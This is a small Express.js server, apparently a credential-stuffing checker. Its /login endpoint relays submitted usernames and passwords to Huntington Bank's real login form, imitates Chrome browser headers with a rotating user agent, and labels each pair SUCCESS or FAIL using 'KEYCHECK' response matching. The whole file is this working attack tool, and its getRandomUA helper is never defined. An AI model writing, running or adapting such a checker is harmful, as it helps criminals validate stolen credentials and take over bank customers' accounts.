import express from "express";
import axios from "axios";

const app = express();
app.use(express.json());

// اختبار إن السيرفر شغال
app.get("/", (req, res) => {
  res.send("API is running");
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({
      success: false,
      error: "Missing username or password"
    });
  }

  try {
    const response = await axios.post(
      "https://digitallobby.huntington.com/pkmslogin.form",
      new URLSearchParams({
        username: username,
        password: password,
        "login-form-type": "pwd"
      }).toString(),
      {
        headers: {
          "Host": "digitallobby.huntington.com",
          "Accept": "application/json, text/plain, */*",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "en-US,en;q=0.9",
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://digitallobby.huntington.com",
          "Referer": "https://digitallobby.huntington.com/login",
          "Sec-CH-UA": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
          "Sec-CH-UA-Mobile": "?0",
          "Sec-CH-UA-Platform": '"Windows"',
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          "User-Agent": getRandomUA(),
          "Priority": "u=1, i"
        },
        timeout: 15000
      }
    );

    const body =
      typeof response.data === "string"
        ? response.data
        : JSON.stringify(response.data);

    // KEYCHECK logic
    if (body.includes('"operation" : "login_success"')) {
      return res.json({
        success: true,
        status: "SUCCESS"
      });
    }

    if (body.includes('"operation" : "login"')) {
      return res.json({
        success: false,
        status: "FAIL"
      });
    }

    return res.json({
      success: false,
      status: "UNKNOWN_RESPONSE"
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
